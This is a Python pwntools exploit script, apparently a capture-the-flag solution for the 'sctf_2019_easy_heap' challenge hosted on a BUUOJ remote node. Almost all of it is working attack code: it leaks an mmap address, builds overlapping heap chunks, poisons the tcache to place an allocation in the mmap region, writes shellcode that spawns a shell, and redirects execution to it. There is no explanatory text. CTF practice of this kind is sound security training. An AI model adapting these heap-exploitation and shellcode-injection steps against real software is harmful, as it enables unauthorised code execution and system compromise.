# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './sctf_2019_easy_heap'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27869'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda            : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size):
    cmd(1)
    sla("Size:",size)
    ru("Address ")
    return rint()

def delete(idx):
    cmd(2)
    sla("Index:",idx)

def edit(idx,text):
    cmd(3)
    sla("Index:",idx)
    sa("Content:",text)

one_gad = one_gadget(libc.path)

ru("Mmap: ")
mmap_addr = int( p.recv(12)[2:] , 16)

add(0x450) #0
add(0x88) #1
add(0x38) #2
add(0x4f8) #3
add(0x18) #4
add(0x58) #5

delete(0)
payload = p64(0)*6 + p64(0x460+0x90 + 0x40)
edit(2,payload)

delete(3)
add(0x450) #0
add(0x58) #3

delete(3) 
edit(1,p64(mmap_addr) + "\n")
add(0x58) #3
add(0x58) #6

payload = asm(shellcraft.sh())
edit(6,payload + "\n")

delete(2)
add(0x28) #2

add(0x18) #7
edit(7,"\x30\n") 

add(0x38) #8 
add(0x38) #9

edit(9,p64(mmap_addr) + "\n")

cmd(1)
sla("Size:",0x50)

p.interactive()

'''
@File    :   sctf_2019_easy_heap.py
@Time    :   2021/08/10 12:00:03
@Author  :   Niyah 
'''